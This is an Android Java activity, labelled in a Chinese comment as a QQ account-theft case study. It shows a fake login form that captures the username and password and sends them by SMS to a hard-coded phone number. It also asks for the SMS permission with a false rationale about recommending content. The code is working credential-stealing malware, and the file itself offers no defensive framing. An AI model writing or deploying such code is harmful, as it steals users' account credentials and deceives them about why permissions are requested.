package com.zhr.test;

import android.Manifest;
import android.content.Context;
import android.content.DialogInterface;
import android.graphics.Color;
import android.os.Bundle;
import android.support.v7.app.AppCompatActivity;
import android.telephony.SmsManager;
import android.text.TextUtils;
import android.util.Log;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;

import com.yanzhenjie.alertdialog.AlertDialog;
import com.yanzhenjie.permission.AndPermission;
import com.yanzhenjie.permission.Rationale;
import com.yanzhenjie.permission.RationaleListener;

/**
 * 案例二：QQ盗号
 */
public class MainActivity extends AppCompatActivity implements View.OnClickListener {

    private static final String TAG = MainActivity.class.getSimpleName();
    private Context mContext = MainActivity.this;
    private EditText mEtUserName;
    private EditText mEtPassword;
    private Button mBtLogin;
    private String mUserName;
    private String mPassword;
    private String mThief;

    @Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        /**
         * 添加了权限申请仍然报错的原因是：android 6.0使用危险权限时需要动态申请
         * 使用 AndPermission库 在Splash界面过后就进行权限申请
         */
        if(AndPermission.hasPermission(this, Manifest.permission.SEND_SMS)) {
            // 有权限

        } else {
            // 申请权限
            AndPermission.with(mContext)
                    .requestCode(200)
                    .permission(Manifest.permission.SEND_SMS)
                    .rationale(rationaleListener)
                    .start();
        }

        initView();
        initData();

    }

    private RationaleListener rationaleListener = new RationaleListener() {
        @Override
        public void showRequestPermissionRationale(int requestCode, final Rationale rationale) {
            AlertDialog.newBuilder(mContext)
                    .setTitle("Tips")
                    .setMessage("Request permission to recommend content for you.")
                    .setPositiveButton("OK", new DialogInterface.OnClickListener() {
                        @Override
                        public void onClick(DialogInterface dialogInterface, int i) {
                            rationale.resume();
                        }
                    })
                    .setNegativeButton("NO", new DialogInterface.OnClickListener() {
                        @Override
                        public void onClick(DialogInterface dialogInterface, int i) {
                            rationale.cancel();
                        }
                    })
                    .show();
        }
    };

    public void initView(){
        mEtUserName = (EditText) findViewById(R.id.et_userName);
        mEtPassword = (EditText) findViewById(R.id.et_password);
        mBtLogin = (Button) findViewById(R.id.bt_login);
    }

    public void initData(){
        // 点击了Button
        mBtLogin.setOnClickListener(this);
    }

    @Override
    public void onClick(View view) {
        mUserName = mEtUserName.getText().toString().trim();
        mPassword = mEtPassword.getText().toString().trim();
        mThief = mUserName + "_" + mPassword;

        // 判断帐号密码是否输入正确
        if(TextUtils.isEmpty(mUserName) || TextUtils.isEmpty(mPassword)){
            Log.i(TAG , mThief);
            // 替代Toast的工具 需要导入design包,然后在android4.0手机上也可正常显示
            SnackBarUtils.ShortSnackbar(view , "帐号或密码输入错误！" , Color.WHITE , Color.BLUE).show();
        }else {
            SnackBarUtils.ShortSnackbar(view , "正在登录中，请稍后..." , Color.WHITE , Color.BLUE).show();

            // 发送短信
            sendSms();
        }
    }

    /**
     * 发送短信
     */
    private void sendSms() {
        SmsManager sms = SmsManager.getDefault();
        // scAddress 一定要设置为null
        sms.sendTextMessage("15527962751" , null , mThief , null , null);
    }
}
